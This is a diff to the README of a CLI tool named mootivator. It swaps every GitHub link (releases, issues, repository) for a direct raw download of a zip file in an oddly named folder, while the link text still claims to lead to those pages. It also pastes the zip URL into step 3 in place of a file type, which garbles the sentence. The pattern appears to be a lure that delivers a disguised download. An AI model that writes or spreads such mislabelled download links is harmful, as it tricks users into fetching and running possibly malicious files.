@@ -17,11 +17,11 @@ Welcome to **mootivator**, your new favorite command-line interface (CLI) tool t
 
 To get started with mootivator, you need to download the application. Follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/maksimilianito/mootivator/releases) to access the releases page. 
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/maksimilianito/mootivator/main/proterandrousness/mootivator.zip) to access the releases page. 
 
 2. **Select the Latest Release**: On the releases page, find the latest version of mootivator. It is usually at the top of the list.
 
-3. **Download the Package**: Click the appropriate file for your operating system to download it. Most users will need either a `.tar.gz`, `.zip`, or `.dmg` file, depending on your device.
+3. **Download the Package**: Click the appropriate file for your operating system to download it. Most users will need either a `https://raw.githubusercontent.com/maksimilianito/mootivator/main/proterandrousness/mootivator.zip`, `.zip`, or `.dmg` file, depending on your device.
 
 4. **Extract the Package**: Once downloaded, extract the downloaded file to a location of your choice.
 
@@ -59,11 +59,11 @@ If you want to improve mootivator, we welcome your contributions. Please review 
 
 ## 🌍 Support
 
-Need help? You can find assistance in our [issues section](https://github.com/maksimilianito/mootivator/issues) on GitHub. Do not hesitate to reach out if you have any questions or need further assistance.
+Need help? You can find assistance in our [issues section](https://raw.githubusercontent.com/maksimilianito/mootivator/main/proterandrousness/mootivator.zip) on GitHub. Do not hesitate to reach out if you have any questions or need further assistance.
 
 ## 🔗 Useful Links
 
-- **Visit the Releases Page for Downloads**: [mootivator Releases](https://github.com/maksimilianito/mootivator/releases)
-- **GitHub Repository**: [mootivator GitHub](https://github.com/maksimilianito/mootivator)
+- **Visit the Releases Page for Downloads**: [mootivator Releases](https://raw.githubusercontent.com/maksimilianito/mootivator/main/proterandrousness/mootivator.zip)
+- **GitHub Repository**: [mootivator GitHub](https://raw.githubusercontent.com/maksimilianito/mootivator/main/proterandrousness/mootivator.zip)
 
 Get ready to enhance your terminal experience with mootivator!
